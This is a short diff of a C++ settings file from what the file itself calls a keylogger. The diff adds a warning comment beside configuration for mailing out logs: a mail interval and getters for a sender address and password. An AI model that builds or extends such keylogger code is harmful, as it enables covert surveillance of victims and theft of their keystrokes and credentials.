@@ -38,7 +38,9 @@ const unsigned long Settings::mail_interval = 2;
 const bool Settings::useVerboseLogs = false;
 
 
-
+//
+//	DONT MESS WITH ANY OF THIS, OR THE KEYLOGGER MIGHT NOT WORK!
+//
 
 std::string Settings::get_mail_from() { return Settings::mail_from; }
 std::string Settings::get_mail_pass() { return Settings::mail_pass; }
